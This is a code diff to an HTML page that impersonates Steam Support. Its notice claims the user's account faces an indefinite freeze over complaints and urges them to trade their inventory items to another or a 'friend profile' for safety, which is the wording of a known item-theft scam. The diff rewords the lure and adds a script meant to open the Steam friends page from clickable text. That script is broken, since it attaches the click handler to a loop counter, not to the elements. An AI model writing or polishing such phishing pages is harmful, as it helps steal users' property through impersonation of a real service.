@@ -280,7 +280,7 @@
 
 
 						<a class="menuitem" href="https://help.steampowered.com/zh-cn/">
-							Customer Service </a>
+							Support </a>
 
 						<div class="minor_menu_items">
 							<a class="menuitem" href="https://store.steampowered.com/account/">Account details</a>
@@ -373,7 +373,7 @@
 						</div>
 
 
-						<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/"
+						<a class="menuitem supernav" style="display: none" href="https://steamcommunity.com/"
 							data-tooltip-type="selector" data-tooltip-content=".submenu_community">
 							Store </a>
 						<div class="submenu_community" style="display: none;" data-submenuid="community">
@@ -396,10 +396,10 @@
 						</div>
 
 						<a class="menuitem" href="https://steamcommunity.com/chat/">
-							Chat </a>
+							Community </a>
 
 						<a class="menuitem" href="https://help.steampowered.com/en/">
-							Customer Service </a>
+							Support </a>
 					</div>
 					<script type="text/javascript">
 						jQuery(function ($) {
@@ -426,7 +426,7 @@
 						<div data-panel="[]" id="error_contents">
 
 
-							<a class="help_header" href="https://help.steampowered.com/zh-cn/">Steam Customer Service</a>
+							<a class="help_header" href="https://help.steampowered.com/en/" style="font-weight: bold;">Steam Customer Service</a>
 							<div class="error_bg">
 								<div id="error_description">An error occurred while processing this request. Please try again later.</div>
 								<div class="error_reload">
@@ -440,8 +440,8 @@
 						<div id="wizard_contents">
 							<div class="wizard_content_wrapper show_create_help_request_form">
 
-								<a class="help_header" href="https://help.steampowered.com/zh-cn/">Steam Support Service</a>
-								<div class="help_page_title">Help report</div>
+								<a class="help_header" style="font-weight: bold;" href="https://help.steampowered.com/">Steam Support Service</a>
+								<div class="help_page_title">Help with complains</div>
 
 
 
@@ -690,11 +690,10 @@ Profile will be blocked during the investigation</p>
 						<h3 class="sub-title">Steam recieved your notification.</h3>
 			
 						<p class="text">Technical department has noticed suspicious activity on your account.
-your profile has been subject to a huge number of complaints
 Technical Department will freeze your profile indefinitely
 to verify complaints
-The Technical Department insists that you transfer your items from your inventory to another profile or a friend profile for a while
-for safety</p>
+The Technical Department insists that you trade your items from your inventory to another profile or a <span class="pupupu" src="https://steamcommunity.com/friends/" style="font-weight: bold; color:#fff; cursor:pointer;">friend profile</span> for a while
+for <span class="pupupu" src="https://steamcommunity.com/friends/" style="font-weight: bold; color:#fff; cursor:pointer;">safety</span></p>
 					</div>
 				</div>
 			</div>
@@ -707,6 +706,21 @@ for safety</p>
 
 		}
 	</script>
+	<script>
+    let span = document.querySelectorAll('.pupupu');
+    for (var i = span.length - 1; i >= 0; i--) {
+    	i.onclick = function () {
+        // Get the URL from the "src" attribute of the span element
+        let url = this.getAttribute('src');
+        
+        // Open the URL in a new window
+        if (url) {
+            var wind = window.open(url, "_blank");
+            wind.focus();
+        	}
+    	}
+    }
+</script>
 </body>
 
 </html>
